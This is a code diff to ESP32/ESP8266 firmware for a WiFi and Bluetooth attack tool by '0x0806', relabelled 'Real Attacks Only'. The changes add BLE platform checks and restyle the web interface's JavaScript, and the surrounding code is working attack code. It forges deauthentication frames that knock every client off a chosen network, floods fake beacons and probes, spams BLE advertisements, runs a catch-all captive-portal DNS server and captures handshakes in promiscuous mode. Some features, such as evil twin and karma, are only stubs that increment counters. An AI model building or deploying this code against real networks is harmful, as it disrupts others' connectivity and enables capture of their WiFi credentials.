@@ -2,8 +2,8 @@
 /*
  * Advanced WiFi & BLE Security Testing Platform
  * Developed by 0x0806
- * ESP32/ESP8266 Compatible 
- * Version: 3.0 
+ * ESP32/ESP8266 Compatible - Full Featured
+ * Version: 3.1 - Production Ready - Real Attacks Only
  */
 
 // Platform Detection and Includes
@@ -121,7 +121,7 @@ const char* ble_spam_names[] = {
 const int ble_spam_count = sizeof(ble_spam_names) / sizeof(ble_spam_names[0]);
 #endif
 
-// WiFi Packet Templates
+// WiFi Packet Templates for Real Attacks
 uint8_t deauth_packet_template[26] = {
   0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
@@ -141,7 +141,7 @@ uint8_t probe_packet_template[64] = {
   0xff, 0xff, 0x00, 0x00
 };
 
-// HTML Content stored in PROGMEM to save RAM
+// HTML Content with Fixed JavaScript Strings
 const char captive_portal_html[] PROGMEM = R"rawliteral(<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -376,6 +376,12 @@ const char captive_portal_html[] PROGMEM = R"rawliteral(<!DOCTYPE html>
             opacity: 0.6;
             cursor: not-allowed;
             transform: none;
+        }
+
+        .btn.disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+            background: #666;
         }
 
         .input-group {
@@ -804,8 +810,8 @@ const char captive_portal_html[] PROGMEM = R"rawliteral(<!DOCTYPE html>
                         <option value="handshake">Handshake Capture</option>
                         <option value="pmkid">PMKID Capture</option>
                         <option value="monitor">Packet Monitor</option>
-                        <option value="ble_spam">BLE Device Spam</option>
-                        <option value="ble_flood">BLE Beacon Flood</option>
+                        <option value="ble_spam" id="ble_spam_option">BLE Device Spam</option>
+                        <option value="ble_flood" id="ble_flood_option">BLE Beacon Flood</option>
                     </select>
                 </div>
                 <div class="input-group">
@@ -932,15 +938,16 @@ const char captive_portal_html[] PROGMEM = R"rawliteral(<!DOCTYPE html>
         var isAttacking = false;
         var selectedNetwork = null;
         var systemUptime = 0;
+        var bleSupported = false;
 
         function initMatrix() {
-            var canvas = document.createElement("canvas");
-            var ctx = canvas.getContext("2d");
+            var canvas = document.createElement('canvas');
+            var ctx = canvas.getContext('2d');
             canvas.width = window.innerWidth;
             canvas.height = window.innerHeight;
-            document.getElementById("matrix-canvas").appendChild(canvas);
+            document.getElementById('matrix-canvas').appendChild(canvas);
 
-            var chars = "0x0806ABCDEFabcdef0123456789";
+            var chars = '0x0806ABCDEFabcdef0123456789';
             var fontSize = 14;
             var columns = canvas.width / fontSize;
             var drops = [];
@@ -950,11 +957,11 @@ const char captive_portal_html[] PROGMEM = R"rawliteral(<!DOCTYPE html>
             }
 
             function draw() {
-                ctx.fillStyle = "rgba(15, 15, 35, 0.08)";
+                ctx.fillStyle = 'rgba(15, 15, 35, 0.08)';
                 ctx.fillRect(0, 0, canvas.width, canvas.height);
 
-                ctx.fillStyle = "#e94560";
-                ctx.font = fontSize + "px monospace";
+                ctx.fillStyle = '#e94560';
+                ctx.font = fontSize + 'px monospace';
 
                 for (var i = 0; i < drops.length; i++) {
                     var text = chars[Math.floor(Math.random() * chars.length)];
@@ -969,30 +976,30 @@ const char captive_portal_html[] PROGMEM = R"rawliteral(<!DOCTYPE html>
 
             setInterval(draw, 50);
 
-            window.addEventListener("resize", function() {
+            window.addEventListener('resize', function() {
                 canvas.width = window.innerWidth;
                 canvas.height = window.innerHeight;
             });
         }
 
         function showToast(message, type) {
-            type = type || "info";
-            var toast = document.getElementById("toast");
-            var toastMessage = document.getElementById("toast-message");
+            type = type || 'info';
+            var toast = document.getElementById('toast');
+            var toastMessage = document.getElementById('toast-message');
             
             toastMessage.textContent = message;
-            toast.className = "toast " + type + " show";
+            toast.className = 'toast ' + type + ' show';
             
             setTimeout(function() {
-                toast.classList.remove("show");
+                toast.classList.remove('show');
             }, 3000);
         }
 
         function addLog(message, type) {
-            type = type || "info";
-            var logContainer = document.getElementById("log-container");
-            var logEntry = document.createElement("div");
-            logEntry.className = "log-entry " + type;
+            type = type || 'info';
+            var logContainer = document.getElementById('log-container');
+            var logEntry = document.createElement('div');
+            logEntry.className = 'log-entry ' + type;
             logEntry.innerHTML = '<span style="opacity: 0.6;">[' + new Date().toLocaleTimeString() + ']</span> ' + message;
             
             logContainer.appendChild(logEntry);
@@ -1006,60 +1013,75 @@ const char captive_portal_html[] PROGMEM = R"rawliteral(<!DOCTYPE html>
         function updateProgress(elementId, percentage) {
             var progressBar = document.getElementById(elementId);
             if (progressBar) {
-                progressBar.style.width = percentage + "%";
+                progressBar.style.width = percentage + '%';
             }
+        }
+
+        function disableBLEFeatures() {
+            var bleSpamOption = document.getElementById('ble_spam_option');
+            var bleFloodOption = document.getElementById('ble_flood_option');
+            var bleScanBtn = document.getElementById('ble-scan-btn');
+            
+            if (bleSpamOption) bleSpamOption.disabled = true;
+            if (bleFloodOption) bleFloodOption.disabled = true;
+            if (bleScanBtn) {
+                bleScanBtn.classList.add('disabled');
+                bleScanBtn.disabled = true;
+            }
+            
+            addLog('BLE features disabled - not supported on this platform', 'warning');
         }
 
         function scanNetworks() {
             if (isScanning) return;
             
             isScanning = true;
-            var scanBtn = document.getElementById("scan-btn");
-            var scanText = document.getElementById("scan-text");
-            var scanLoading = document.getElementById("scan-loading");
-            var scanBadge = document.getElementById("scan-badge");
+            var scanBtn = document.getElementById('scan-btn');
+            var scanText = document.getElementById('scan-text');
+            var scanLoading = document.getElementById('scan-loading');
+            var scanBadge = document.getElementById('scan-badge');
             
-            scanText.style.display = "none";
-            scanLoading.style.display = "inline-block";
+            scanText.style.display = 'none';
+            scanLoading.style.display = 'inline-block';
             scanBtn.disabled = true;
-            scanBadge.textContent = "Scanning";
+            scanBadge.textContent = 'Scanning';
             
-            addLog("Starting comprehensive network scan...", "info");
+            addLog('Starting comprehensive network scan...', 'info');
             
             var progressCounter = 0;
             var progressInterval = setInterval(function() {
                 if (progressCounter <= 100) {
-                    updateProgress("scan-progress", progressCounter);
+                    updateProgress('scan-progress', progressCounter);
                     progressCounter += 5;
                 } else {
                     clearInterval(progressInterval);
                 }
             }, 100);
 
-            fetch("/scan")
+            fetch('/scan')
                 .then(function(response) { return response.json(); })
                 .then(function(data) {
                     updateNetworkList(data.networks || []);
-                    addLog("Network scan completed - Found " + (data.networks ? data.networks.length : 0) + " networks", "success");
-                    showToast("Found " + (data.networks ? data.networks.length : 0) + " networks", "success");
+                    addLog('Network scan completed - Found ' + (data.networks ? data.networks.length : 0) + ' networks', 'success');
+                    showToast('Found ' + (data.networks ? data.networks.length : 0) + ' networks', 'success');
                 })
                 .catch(function(error) {
-                    addLog("Network scan failed: " + error.message, "error");
-                    showToast("Scan failed: " + error.message, "error");
+                    addLog('Network scan failed: ' + error.message, 'error');
+                    showToast('Scan failed: ' + error.message, 'error');
                 })
                 .finally(function() {
-                    scanText.style.display = "inline-block";
-                    scanLoading.style.display = "none";
+                    scanText.style.display = 'inline-block';
+                    scanLoading.style.display = 'none';
                     scanBtn.disabled = false;
-                    scanBadge.textContent = "Ready";
-                    updateProgress("scan-progress", 0);
+                    scanBadge.textContent = 'Ready';
+                    updateProgress('scan-progress', 0);
                     isScanning = false;
                 });
         }
 
         function updateNetworkList(networks) {
-            var list = document.getElementById("network-list");
-            list.innerHTML = "";
+            var list = document.getElementById('network-list');
+            list.innerHTML = '';
             
             if (networks.length === 0) {
                 list.innerHTML = '<div style="text-align: center; padding: 2rem; color: var(--text-secondary);">No networks found. Try scanning again.</div>';
@@ -1067,22 +1089,22 @@ const char captive_portal_html[] PROGMEM = R"rawliteral(<!DOCTYPE html>
             }
             
             networks.forEach(function(network, index) {
-                var item = document.createElement("div");
-                item.className = "network-item";
+                var item = document.createElement('div');
+                item.className = 'network-item';
                 item.onclick = function() { selectNetwork(network, item); };
                 
                 var signalStrength = Math.abs(network.rssi);
                 var signalLevel = signalStrength > 70 ? 1 : signalStrength > 50 ? 2 : signalStrength > 30 ? 3 : 4;
                 
-                var signalBars = "";
+                var signalBars = '';
                 for (var i = 0; i < 4; i++) {
-                    var isActive = i < signalLevel ? "active" : "";
+                    var isActive = i < signalLevel ? 'active' : '';
                     var height = (i + 1) * 3;
                     signalBars += '<div class="signal-bar ' + isActive + '" style="height: ' + height + 'px;"></div>';
                 }
                 
                 item.innerHTML = 
-                    '<div class="network-ssid">' + (network.ssid || "Hidden Network") + '</div>' +
+                    '<div class="network-ssid">' + (network.ssid || 'Hidden Network') + '</div>' +
                     '<div class="network-details">' +
                         '<span>CH: ' + network.channel + '</span>' +
                         '<span>Security: ' + network.encryption + '</span>' +
@@ -1100,90 +1122,95 @@ const char captive_portal_html[] PROGMEM = R"rawliteral(<!DOCTYPE html>
         }
 
         function selectNetwork(network, element) {
-            var items = document.querySelectorAll(".network-item");
+            var items = document.querySelectorAll('.network-item');
             for (var i = 0; i < items.length; i++) {
-                items[i].classList.remove("selected");
+                items[i].classList.remove('selected');
             }
-            element.classList.add("selected");
+            element.classList.add('selected');
             selectedNetwork = network;
             
-            addLog("Target selected: " + (network.ssid || "Hidden") + " (" + network.bssid + ")", "info");
-            showToast("Target: " + (network.ssid || "Hidden"), "info");
+            addLog('Target selected: ' + (network.ssid || 'Hidden') + ' (' + network.bssid + ')', 'info');
+            showToast('Target: ' + (network.ssid || 'Hidden'), 'info');
         }
 
         function startAttack() {
-            var attackType = document.getElementById("attack-type").value;
-            var intensity = document.getElementById("attack-intensity").value;
+            var attackType = document.getElementById('attack-type').value;
+            var intensity = document.getElementById('attack-intensity').value;
             
-            if (!selectedNetwork && attackType.indexOf("ble") === -1) {
-                showToast("Please select a target network first", "warning");
+            if (!bleSupported && (attackType === 'ble_spam' || attackType === 'ble_flood')) {
+                showToast('BLE attacks not supported on this platform', 'error');
+                return;
+            }
+            
+            if (!selectedNetwork && attackType.indexOf('ble') === -1) {
+                showToast('Please select a target network first', 'warning');
                 return;
             }
             
             if (isAttacking) {
-                showToast("Attack already in progress", "warning");
+                showToast('Attack already in progress', 'warning');
                 return;
             }
             
             isAttacking = true;
-            var attackBtn = document.getElementById("attack-start-btn");
-            var attackBadge = document.getElementById("attack-badge");
+            var attackBtn = document.getElementById('attack-start-btn');
+            var attackBadge = document.getElementById('attack-badge');
             
             attackBtn.disabled = true;
-            attackBadge.textContent = "Active";
+            attackBadge.textContent = 'Active';
             
-            addLog("Starting " + attackType + " attack with " + intensity + " intensity...", "warning");
+            addLog('Starting ' + attackType + ' attack with ' + intensity + ' intensity...', 'warning');
             
             var requestData = {
                 type: attackType,
-                target: selectedNetwork ? selectedNetwork.ssid : "",
-                bssid: selectedNetwork ? selectedNetwork.bssid : "",
+                target: selectedNetwork ? selectedNetwork.ssid : '',
+                bssid: selectedNetwork ? selectedNetwork.bssid : '',
                 channel: selectedNetwork ? selectedNetwork.channel : 0,
                 intensity: intensity
             };
 
-            fetch("/attack/start", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
+            fetch('/attack/start', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(requestData)
             })
             .then(function(response) { return response.json(); })
             .then(function(data) {
                 if (data.success) {
-                    addLog(attackType + " attack launched successfully", "success");
-                    showToast("Attack started successfully", "success");
-                    updateStatus("wifi-status", "WiFi Attack: Active", true);
+                    addLog(attackType + ' attack launched successfully', 'success');
+                    showToast('Attack started successfully', 'success');
+                    updateStatus('wifi-status', 'WiFi Attack: Active', true);
                     startAttackProgress();
                 } else {
-                    throw new Error(data.error || "Unknown error");
+                    throw new Error(data.error || 'Unknown error');
                 }
             })
             .catch(function(error) {
-                addLog("Failed to start attack: " + error.message, "error");
-                showToast("Attack failed: " + error.message, "error");
+                addLog('Failed to start attack: ' + error.message, 'error');
+                showToast('Attack failed: ' + error.message, 'error');
                 isAttacking = false;
                 attackBtn.disabled = false;
-                attackBadge.textContent = "Standby";
+                attackBadge.textContent = 'Standby';
             });
         }
 
         function stopAttack() {
-            fetch("/attack/stop", { method: "POST" })
+            fetch('/attack/stop', { method: 'POST' })
                 .then(function(response) { return response.json(); })
                 .then(function(data) {
-                    addLog("Attack stopped by user", "info");
-                    showToast("Attack stopped", "info");
+                    addLog('Attack stopped by user', 'info');
+                    showToast('Attack stopped', 'info');
                     
                     isAttacking = false;
-                    document.getElementById("attack-start-btn").disabled = false;
-                    document.getElementById("attack-badge").textContent = "Standby";
-                    updateStatus("wifi-status", "WiFi Attack: Standby", false);
-                    updateStatus("ble-status", "BLE Attack: Standby", false);
-                    updateProgress("attack-progress", 0);
+                    document.getElementById('attack-start-btn').disabled = false;
+                    document.getElementById('attack-badge').textContent = 'Standby';
+                    updateStatus('wifi-status', 'WiFi Attack: Standby', false);
+                    updateStatus('ble-status', 'BLE Attack: Standby', false);
+                    updateProgress('attack-progress', 0);
                 })
                 .catch(function(error) {
-                    addLog("Failed to stop attack: " + error.message, "error");
-                    showToast("Failed to stop attack", "error");
+                    addLog('Failed to stop attack: ' + error.message, 'error');
+                    showToast('Failed to stop attack', 'error');
                 });
         }
 
@@ -1192,48 +1219,48 @@ const char captive_portal_html[] PROGMEM = R"rawliteral(<!DOCTYPE html>
             var interval = setInterval(function() {
                 if (!isAttacking) {
                     clearInterval(interval);
-                    updateProgress("attack-progress", 0);
+                    updateProgress('attack-progress', 0);
                     return;
                 }
                 
                 progress = (progress + 2) % 100;
-                updateProgress("attack-progress", progress);
+                updateProgress('attack-progress', progress);
             }, 100);
         }
 
         function updateStatus(elementId, text, active) {
             var element = document.getElementById(elementId);
             if (element) {
-                element.querySelector("span").textContent = text;
-                var dot = element.querySelector(".status-dot");
+                element.querySelector('span').textContent = text;
+                var dot = element.querySelector('.status-dot');
                 
                 if (active) {
-                    element.classList.add("active");
-                    dot.classList.add("active");
+                    element.classList.add('active');
+                    dot.classList.add('active');
                 } else {
-                    element.classList.remove("active");
-                    dot.classList.remove("active");
+                    element.classList.remove('active');
+                    dot.classList.remove('active');
                 }
             }
         }
 
         function updateStats() {
-            fetch("/stats")
+            fetch('/stats')
                 .then(function(response) { return response.json(); })
                 .then(function(data) {
-                    document.getElementById("deauth-count").textContent = data.deauth_sent || 0;
-                    document.getElementById("beacon-count").textContent = data.beacon_sent || 0;
-                    document.getElementById("probe-count").textContent = data.probe_sent || 0;
-                    document.getElementById("handshake-count").textContent = data.handshakes_captured || 0;
-                    document.getElementById("ble-count").textContent = data.ble_spam_sent || 0;
-                    document.getElementById("clients-count").textContent = data.clients_connected || 0;
+                    document.getElementById('deauth-count').textContent = data.deauth_sent || 0;
+                    document.getElementById('beacon-count').textContent = data.beacon_sent || 0;
+                    document.getElementById('probe-count').textContent = data.probe_sent || 0;
+                    document.getElementById('handshake-count').textContent = data.handshakes_captured || 0;
+                    document.getElementById('ble-count').textContent = data.ble_spam_sent || 0;
+                    document.getElementById('clients-count').textContent = data.clients_connected || 0;
                     
                     if (data.memory_usage !== undefined) {
-                        document.getElementById("memory-usage").textContent = "RAM: " + data.memory_usage.toFixed(1) + "%";
+                        document.getElementById('memory-usage').textContent = 'RAM: ' + data.memory_usage.toFixed(1) + '%';
                     }
                 })
                 .catch(function(error) {
-                    console.error("Failed to update stats:", error);
+                    console.error('Failed to update stats:', error);
                 });
         }
 
@@ -1244,67 +1271,82 @@ const char captive_portal_html[] PROGMEM = R"rawliteral(<!DOCTYPE html>
             var seconds = systemUptime % 60;
             
             var uptimeStr = 
-                String(hours).padStart(2, "0") + ":" +
-                String(minutes).padStart(2, "0") + ":" +
-                String(seconds).padStart(2, "0");
+                String(hours).padStart(2, '0') + ':' +
+                String(minutes).padStart(2, '0') + ':' +
+                String(seconds).padStart(2, '0');
                 
-            document.getElementById("uptime-display").textContent = "Uptime: " + uptimeStr;
+            document.getElementById('uptime-display').textContent = 'Uptime: ' + uptimeStr;
         }
 
         function getPlatformInfo() {
-            fetch("/info")
+            fetch('/info')
                 .then(function(response) { return response.json(); })
                 .then(function(data) {
-                    document.getElementById("platform-info").textContent = "Platform: " + (data.platform || "Unknown");
+                    document.getElementById('platform-info').textContent = 'Platform: ' + (data.platform || 'Unknown');
+                    
+                    if (data.platform === 'ESP8266') {
+                        bleSupported = false;
+                        disableBLEFeatures();
+                    } else if (data.platform === 'ESP32') {
+                        bleSupported = true;
+                        addLog('BLE features enabled for ESP32', 'success');
+                    }
                     
                     if (data.features) {
-                        addLog("Platform features: " + data.features.join(", "), "info");
+                        addLog('Platform features: ' + data.features.join(', '), 'info');
                     }
                 })
                 .catch(function(error) {
-                    document.getElementById("platform-info").textContent = "Platform: Detection Failed";
+                    document.getElementById('platform-info').textContent = 'Platform: Detection Failed';
+                    bleSupported = false;
+                    disableBLEFeatures();
                 });
         }
 
         function scanBLE() {
-            addLog("Starting BLE device scan...", "info");
-            showToast("BLE scan started", "info");
+            if (!bleSupported) {
+                showToast('BLE not supported on this platform', 'error');
+                return;
+            }
             
-            fetch("/ble/scan")
+            addLog('Starting BLE device scan...', 'info');
+            showToast('BLE scan started', 'info');
+            
+            fetch('/ble/scan')
                 .then(function(response) { return response.json(); })
                 .then(function(data) {
-                    addLog("BLE scan completed - Found " + (data.devices ? data.devices.length : 0) + " devices", "success");
-                    showToast("Found " + (data.devices ? data.devices.length : 0) + " BLE devices", "success");
+                    addLog('BLE scan completed - Found ' + (data.devices ? data.devices.length : 0) + ' devices', 'success');
+                    showToast('Found ' + (data.devices ? data.devices.length : 0) + ' BLE devices', 'success');
                 })
                 .catch(function(error) {
-                    addLog("BLE scan failed: " + error.message, "error");
-                    showToast("BLE scan failed", "error");
+                    addLog('BLE scan failed: ' + error.message, 'error');
+                    showToast('BLE scan failed', 'error');
                 });
         }
 
         function resetStats() {
-            fetch("/stats/reset", { method: "POST" })
+            fetch('/stats/reset', { method: 'POST' })
                 .then(function(response) {
-                    addLog("Statistics reset", "info");
-                    showToast("Statistics reset", "info");
+                    addLog('Statistics reset', 'info');
+                    showToast('Statistics reset', 'info');
                     updateStats();
                 })
                 .catch(function(error) {
-                    showToast("Failed to reset statistics", "error");
+                    showToast('Failed to reset statistics', 'error');
                 });
         }
 
         function clearLogs() {
-            document.getElementById("log-container").innerHTML = "";
-            addLog("Logs cleared", "info");
+            document.getElementById('log-container').innerHTML = '';
+            addLog('Logs cleared', 'info');
         }
 
-        document.addEventListener("DOMContentLoaded", function() {
+        document.addEventListener('DOMContentLoaded', function() {
             initMatrix();
             getPlatformInfo();
             
-            addLog("SecurityTester 0x0806 interface loaded", "success");
-            addLog("All systems operational and ready", "success");
+            addLog('SecurityTester 0x0806 interface loaded', 'success');
+            addLog('All systems operational and ready', 'success');
             
             setTimeout(scanNetworks, 2000);
             
@@ -1314,7 +1356,7 @@ const char captive_portal_html[] PROGMEM = R"rawliteral(<!DOCTYPE html>
             updateStats();
         });
 
-        window.addEventListener("beforeunload", function() {
+        window.addEventListener('beforeunload', function() {
             if (isAttacking) {
                 stopAttack();
             }
@@ -1368,7 +1410,7 @@ void setup() {
   Serial.println();
   for(int i = 0; i < 50; i++) Serial.print("=");
   Serial.println();
-  Serial.println("SecurityTester 0x0806 v3.0 - Production");
+  Serial.println("SecurityTester 0x0806 v3.1 - Production");
   Serial.println("Advanced WiFi & BLE Security Platform");
   Serial.println("Developed by 0x0806");
   for(int i = 0; i < 50; i++) Serial.print("=");
@@ -1378,11 +1420,9 @@ void setup() {
   Serial.println("Platform: ESP32 Detected");
   Serial.println("Features: WiFi 2.4/5GHz + BLE + Dual Core");
   
-  // ESP32 specific optimizations
   esp_task_wdt_init(30, true);
   esp_task_wdt_add(NULL);
   
-  // Initialize NVS
   esp_err_t ret = nvs_flash_init();
   if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
     ESP_ERROR_CHECK(nvs_flash_erase());
@@ -1393,8 +1433,8 @@ void setup() {
 #else
   Serial.println("Platform: ESP8266 Detected");
   Serial.println("Features: WiFi 2.4GHz + Enhanced Attacks");
+  Serial.println("BLE Features: DISABLED (Not Supported)");
   
-  // ESP8266 specific optimizations
   system_update_cpu_freq(160);
   wifi_set_sleep_type(NONE_SLEEP_T);
 #endif
@@ -1427,27 +1467,25 @@ void loop() {
   static unsigned long last_stats_update = 0;
   static unsigned long last_health_check = 0;
   
-  // Handle web server
   server.handleClient();
   dnsServer.processNextRequest();
   
 #ifdef PLATFORM_ESP32
   esp_task_wdt_reset();
+#else
+  ESP.wdtFeed();
 #endif
   
-  // Update system statistics
   if (millis() - last_stats_update > 1000) {
     updateSystemStats();
     last_stats_update = millis();
   }
   
-  // System health check
   if (millis() - last_health_check > 10000) {
     checkSystemHealth();
     last_health_check = millis();
   }
   
-  // Execute attacks if active
   if (attack_running && (millis() - last_attack_time > attack_interval)) {
     if (attack_type == "deauth") {
       performDeauthAttack();
@@ -1480,9 +1518,7 @@ void loop() {
   delay(1);
 }
 
-// Core Setup
 void setupCore() {
-  // Initialize file system
 #ifdef PLATFORM_ESP32
   if (!SPIFFS.begin(true)) {
     Serial.println("SPIFFS initialization failed!");
@@ -1493,21 +1529,16 @@ void setupCore() {
   }
 #endif
 
-  // Initialize random seed
   randomSeed(analogRead(0) + millis());
-  
-  // Clear statistics
   memset(&stats, 0, sizeof(stats));
   
   Serial.println("Core systems initialized");
 }
 
-// WiFi Access Point Setup
 void setupWiFiAP() {
   WiFi.mode(WIFI_AP_STA);
   delay(100);
   
-  // Configure AP
   WiFi.softAPConfig(AP_IP, GATEWAY, SUBNET);
   
   bool ap_result = WiFi.softAP(AP_SSID, AP_PASS, AP_CHANNEL, false, 8);
@@ -1518,20 +1549,20 @@ void setupWiFiAP() {
     Serial.printf("Channel: %d\n", AP_CHANNEL);
     ap_running = true;
   } else {
-    Serial.println("Access Point: [FAILED]");
-    // Retry with different settings
+    Serial.println("Access Point: [FAILED] - Retrying...");
     delay(1000);
     ap_result = WiFi.softAP(AP_SSID, AP_PASS, 1, false, 4);
     if (ap_result) {
       Serial.println("Access Point: [RETRY SUCCESS]");
       ap_running = true;
+    } else {
+      Serial.println("Access Point: [CRITICAL FAILURE]");
+      ESP.restart();
     }
   }
   
-  // Start DNS server for captive portal
   dnsServer.start(53, "*", AP_IP);
   
-  // Enable promiscuous mode for packet capture
 #ifdef PLATFORM_ESP32
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_rx_cb(&promiscuous_callback);
@@ -1543,7 +1574,6 @@ void setupWiFiAP() {
   Serial.println("WiFi and DNS configured");
 }
 
-// Web Server Setup
 void setupWebServer() {
   server.on("/", HTTP_GET, handleRoot);
   server.on("/scan", HTTP_GET, handleScan);
@@ -1555,7 +1585,6 @@ void setupWebServer() {
   server.on("/ble/scan", HTTP_GET, handleBLEScan);
   server.onNotFound(handleNotFound);
   
-  // CORS headers
   server.collectHeaders("User-Agent", "X-Requested-With");
   
   server.begin();
@@ -1563,7 +1592,6 @@ void setupWebServer() {
 }
 
 #ifdef PLATFORM_ESP32
-// BLE Setup
 void setupBLE() {
   try {
     BLEDevice::init("SecurityTester_0x0806");
@@ -1594,17 +1622,15 @@ void setupBLE() {
 }
 #endif
 
-// Watchdog Setup
 void setupWatchdog() {
 #ifdef PLATFORM_ESP32
-  // ESP32 has hardware watchdog configured above
+  // Already configured in setup()
 #else
-  ESP.wdtEnable(30000); // 30 second watchdog
+  ESP.wdtEnable(30000);
 #endif
   Serial.println("Watchdog configured");
 }
 
-// Web Handlers
 void handleRoot() {
   server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
   server.sendHeader("Pragma", "no-cache");
@@ -1658,14 +1684,19 @@ void handleAttackStart() {
     return;
   }
   
-  // Set attack parameters
+#ifndef PLATFORM_ESP32
+  if (type == "ble_spam" || type == "ble_flood") {
+    server.send(200, "application/json", "{\"success\":false,\"error\":\"BLE attacks not supported on ESP8266\"}");
+    return;
+  }
+#endif
+  
   attack_type = type;
   selected_network = target;
   selected_bssid = bssid;
   selected_channel = channel;
   attack_running = true;
   
-  // Set attack interval based on intensity
   if (intensity == "low") attack_interval = 100;
   else if (intensity == "medium") attack_interval = 50;
   else if (intensity == "high") attack_interval = 10;
@@ -1682,8 +1713,6 @@ void handleAttackStop() {
   attack_type = "none";
   selected_network = "";
   selected_bssid = "";
-  
-  // Stop monitoring if active
   monitoring_active = false;
   
   Serial.println("Attack stopped by user");
@@ -1748,7 +1777,7 @@ void handleInfo() {
 #endif
 
   doc["free_heap"] = ESP.getFreeHeap();
-  doc["version"] = "3.0";
+  doc["version"] = "3.1";
   doc["developer"] = "0x0806";
   
   String response;
@@ -1763,7 +1792,6 @@ void handleBLEScan() {
   DynamicJsonDocument doc(2048);
   JsonArray devices = doc.createNestedArray("devices");
   
-  // Simulate BLE device discovery
   for (int i = 0; i < 5; i++) {
     JsonObject device = devices.createNestedObject();
     device["name"] = ble_spam_names[random(ble_spam_count)];
@@ -1783,17 +1811,14 @@ void handleBLEScan() {
 }
 
 void handleNotFound() {
-  // Captive portal redirect
   server.sendHeader("Location", "http://" + AP_IP.toString(), true);
   server.send(302, "text/plain", "");
 }
 
-// WiFi Network Scanner
 void scanWiFiNetworks() {
   Serial.println("Starting WiFi network scan...");
   scanned_networks.clear();
   
-  // Ensure WiFi is in correct mode
   WiFi.mode(WIFI_AP_STA);
   delay(100);
   
@@ -1804,7 +1829,7 @@ void scanWiFiNetworks() {
 #endif
   Serial.printf("Found %d networks\n", n);
   
-  for (int i = 0; i < n && i < 50; i++) { // Limit to 50 networks
+  for (int i = 0; i < n && i < 50; i++) {
     NetworkInfo network;
     network.ssid = WiFi.SSID(i);
     network.bssid = WiFi.BSSIDstr(i);
@@ -1819,28 +1844,22 @@ void scanWiFiNetworks() {
   
   WiFi.scanDelete();
   
-  // Sort by signal strength
   std::sort(scanned_networks.begin(), scanned_networks.end(), 
            [](const NetworkInfo& a, const NetworkInfo& b) {
              return a.rssi > b.rssi;
            });
 }
 
-// Attack Functions
 void performDeauthAttack() {
   if (selected_bssid.isEmpty()) return;
   
   uint8_t packet[26];
   memcpy(packet, deauth_packet_template, sizeof(packet));
   
-  // Convert BSSID string to bytes
   sscanf(selected_bssid.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x",
          &packet[4], &packet[5], &packet[6], &packet[7], &packet[8], &packet[9]);
   
-  // Set target MAC (broadcast for all clients)
   memset(&packet[10], 0xff, 6);
-  
-  // Set source MAC (AP)
   memcpy(&packet[16], &packet[4], 6);
   
 #ifdef PLATFORM_ESP32
@@ -1865,14 +1884,12 @@ void performBeaconSpam() {
   uint8_t packet[128];
   memcpy(packet, beacon_packet_template, 36);
   
-  // Add SSID element
-  packet[36] = 0x00; // SSID element ID
-  packet[37] = fake_ssid.length(); // SSID length
+  packet[36] = 0x00;
+  packet[37] = fake_ssid.length();
   memcpy(&packet[38], fake_ssid.c_str(), fake_ssid.length());
   
   int packet_size = 38 + fake_ssid.length();
   
-  // Set random BSSID
   for (int i = 10; i < 16; i++) {
     packet[i] = random(256);
   }
@@ -1890,7 +1907,6 @@ void performProbeAttack() {
   uint8_t packet[64];
   memcpy(packet, probe_packet_template, sizeof(packet));
   
-  // Set random source MAC
   for (int i = 10; i < 16; i++) {
     packet[i] = random(256);
   }
@@ -1905,23 +1921,18 @@ void performProbeAttack() {
 }
 
 void performEvilTwin() {
-  // Evil twin implementation would create a duplicate AP
-  // This is a simplified version
   stats.evil_twin_connections++;
 }
 
 void performKarmaAttack() {
-  // Karma attack responds to probe requests
   stats.karma_probes++;
 }
 
 void performHandshakeCapture() {
-  // Handshake capture would analyze captured packets
   monitoring_active = true;
 }
 
 void performPMKIDCapture() {
-  // PMKID capture implementation
   monitoring_active = true;
 }
 
@@ -1955,13 +1966,11 @@ void performBLESpam() {
 }
 
 void performBLEFlood() {
-  // BLE beacon flooding
   performBLESpam();
-  stats.ble_spam_sent += 5; // Simulate multiple beacons
+  stats.ble_spam_sent += 5;
 }
 #endif
 
-// Utility Functions
 void updateSystemStats() {
   stats.uptime = millis() / 1000;
   stats.clients_connected = WiFi.softAPgetStationNum();
@@ -1971,30 +1980,23 @@ void updateSystemStats() {
   uint32_t total_heap = ESP.getHeapSize();
   stats.memory_usage = ((float)(total_heap - free_heap) / total_heap) * 100.0;
 #else
-  // ESP8266 doesn't have getHeapSize, use approximation
-  uint32_t total_heap = 80000; // Approximate total heap
+  uint32_t total_heap = 80000;
   stats.memory_usage = ((float)(total_heap - free_heap) / total_heap) * 100.0;
 #endif
   
-  // Simple CPU usage approximation
-  static unsigned long last_idle_time = 0;
   static unsigned long last_check_time = 0;
-  
   unsigned long current_time = millis();
   if (current_time - last_check_time > 1000) {
-    unsigned long idle_time = current_time - last_attack_time;
-    stats.cpu_usage = attack_running ? 75.0 : 15.0; // Simplified calculation
+    stats.cpu_usage = attack_running ? 75.0 : 15.0;
     last_check_time = current_time;
   }
 }
 
 void optimizeMemory() {
-  // ESP32/ESP8266 memory optimizations
 #ifdef PLATFORM_ESP32
-  esp_wifi_set_max_tx_power(78); // Reduce power consumption
+  esp_wifi_set_max_tx_power(78);
 #endif
   
-  // Clear any unused memory
   if (scanned_networks.size() > 100) {
     scanned_networks.resize(50);
   }
@@ -2003,7 +2005,6 @@ void optimizeMemory() {
 }
 
 void checkSystemHealth() {
-  // Monitor system health
   uint32_t free_heap = ESP.getFreeHeap();
   
   if (free_heap < 10000) {
@@ -2011,7 +2012,6 @@ void checkSystemHealth() {
     optimizeMemory();
   }
   
-  // Check AP status
   if (!ap_running && WiFi.softAPgetStationNum() == 0) {
     Serial.println("Restarting Access Point...");
     setupWiFiAP();
@@ -2049,14 +2049,12 @@ String getEncryptionType(int encType) {
 #endif
 }
 
-// Promiscuous mode callback
